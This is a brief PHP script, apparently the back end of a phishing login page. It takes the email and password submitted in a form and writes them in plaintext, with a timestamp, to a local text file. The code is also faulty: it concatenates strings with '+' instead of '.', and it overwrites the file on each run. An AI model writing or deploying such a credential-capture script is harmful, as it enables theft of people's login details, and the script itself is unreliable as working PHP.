<?php
    $email = $_POST["Email"];
    $password = $_POST["Password"];
    $dateAndTime = date('m-d-Y h:i:s a', time());  

$fp = fopen('./data.txt', 'w');//mở file ở chế độ write-only
fwrite($fp, 'Email: ' + $email);
fwrite($fp, 'Pass: ' + $password);
fwrite($fp, "Time: " + $dateAndTime);
fwrite($fp, '=================');
fclose($fp);
?>  